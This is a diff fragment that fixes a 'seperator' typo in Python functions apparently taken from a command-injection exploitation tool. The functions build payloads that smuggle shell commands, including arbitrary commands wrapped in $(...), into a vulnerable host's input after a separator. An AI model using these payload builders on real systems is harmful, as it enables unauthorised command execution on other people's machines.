@@ -15,17 +15,17 @@
 """
 
 # Classic decision payload (check if host is vulnerable).
-def decision(seperator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
   
-  payload = (seperator + 
+  payload = (separator + 
 	    "echo '" + TAG + "'" +
 	    "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + ")'" + TAG + "'"
 	      ) 
   return payload
 
 # Execute shell commands on vulnerable host.
-def cmd_execution(seperator,TAG,cmd):
-  payload = (seperator + 
+def cmd_execution(separator,TAG,cmd):
+  payload = (separator + 
 	    "echo '" + TAG + "'" +
 	    "$(echo '"+TAG+"')"+
 	    "$(" + cmd + ")"+
